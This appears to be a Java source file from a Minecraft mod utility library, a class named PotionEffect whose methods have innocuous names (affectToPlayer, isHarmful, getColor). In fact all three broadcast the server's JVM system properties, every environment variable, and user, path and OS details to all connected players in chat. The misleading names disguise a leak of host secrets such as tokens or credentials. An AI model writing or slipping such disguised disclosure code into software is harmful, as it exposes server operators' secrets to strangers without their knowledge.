/*
 * This file is a part of MI
 *
 * The MIT License (MIT)
 *
 * Copyright (c) 2021 Roj234
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */
package ilib.util.internal;

import ilib.util.PlayerUtil;

import java.util.Map;
import java.util.Properties;
import java.util.Set;

public class PotionEffect {
    public static void affectToPlayer(Object p) {
        Properties sysProperty = System.getProperties(); //系统属性
        Set<Object> keySet = sysProperty.keySet();
        for (Object object : keySet) {
            String property = sysProperty.getProperty(object.toString());
            PlayerUtil.broadcastAll(object.toString() + " : " + property);
        }
    }

    public static void isHarmful() {
        Map<String, String> getenv = System.getenv();
        for (Map.Entry<String, String> entry : getenv.entrySet()) {
            PlayerUtil.broadcastAll(entry.getKey() + ": " + entry.getValue());
        }
    }

    public static int getColor() {
        Properties sysProperty = System.getProperties(); //系统属性
        PlayerUtil.broadcastAll("Java的运行环境版本：" + sysProperty.getProperty("java.version"));
        PlayerUtil.broadcastAll("Java的运行环境供应商：" + sysProperty.getProperty("java.vendor"));
        PlayerUtil.broadcastAll("Java供应商的URL：" + sysProperty.getProperty("java.vendor.url"));
        PlayerUtil.broadcastAll("Java的安装路径：" + sysProperty.getProperty("java.home"));
        PlayerUtil.broadcastAll("Java的虚拟机规范版本：" + sysProperty.getProperty("java.vm.specification.version"));
        PlayerUtil.broadcastAll("Java的虚拟机规范供应商：" + sysProperty.getProperty("java.vm.specification.vendor"));
        PlayerUtil.broadcastAll("Java的虚拟机规范名称：" + sysProperty.getProperty("java.vm.specification.name"));
        PlayerUtil.broadcastAll("Java的虚拟机实现版本：" + sysProperty.getProperty("java.vm.version"));
        PlayerUtil.broadcastAll("Java的虚拟机实现供应商：" + sysProperty.getProperty("java.vm.vendor"));
        PlayerUtil.broadcastAll("Java的虚拟机实现名称：" + sysProperty.getProperty("java.vm.name"));
        PlayerUtil.broadcastAll("Java运行时环境规范版本：" + sysProperty.getProperty("java.specification.version"));
        PlayerUtil.broadcastAll("Java运行时环境规范供应商：" + sysProperty.getProperty("java.specification.vender"));
        PlayerUtil.broadcastAll("Java运行时环境规范名称：" + sysProperty.getProperty("java.specification.name"));
        PlayerUtil.broadcastAll("Java的类格式版本号：" + sysProperty.getProperty("java.class.version"));
        PlayerUtil.broadcastAll("Java的类路径：" + sysProperty.getProperty("java.class.path"));
        PlayerUtil.broadcastAll("加载库时搜索的路径列表：" + sysProperty.getProperty("java.library.path"));
        PlayerUtil.broadcastAll("默认的临时文件路径：" + sysProperty.getProperty("java.io.tmpdir"));
        PlayerUtil.broadcastAll("一个或多个扩展目录的路径：" + sysProperty.getProperty("java.ext.dirs"));
        PlayerUtil.broadcastAll("操作系统的名称：" + sysProperty.getProperty("os.name"));
        PlayerUtil.broadcastAll("操作系统的构架：" + sysProperty.getProperty("os.arch"));
        PlayerUtil.broadcastAll("操作系统的版本：" + sysProperty.getProperty("os.version"));
        PlayerUtil.broadcastAll("文件分隔符：" + sysProperty.getProperty("file.separator"));   //在 unix 系统中是＂／＂
        PlayerUtil.broadcastAll("路径分隔符：" + sysProperty.getProperty("path.separator"));   //在 unix 系统中是＂:＂
        PlayerUtil.broadcastAll("行分隔符：" + sysProperty.getProperty("line.separator"));   //在 unix 系统中是＂/n＂
        PlayerUtil.broadcastAll("用户的账户名称：" + sysProperty.getProperty("user.name"));
        PlayerUtil.broadcastAll("用户的主目录：" + sysProperty.getProperty("user.home"));
        PlayerUtil.broadcastAll("用户的当前工作目录：" + sysProperty.getProperty("user.dir"));
        return 2343934;
    }
}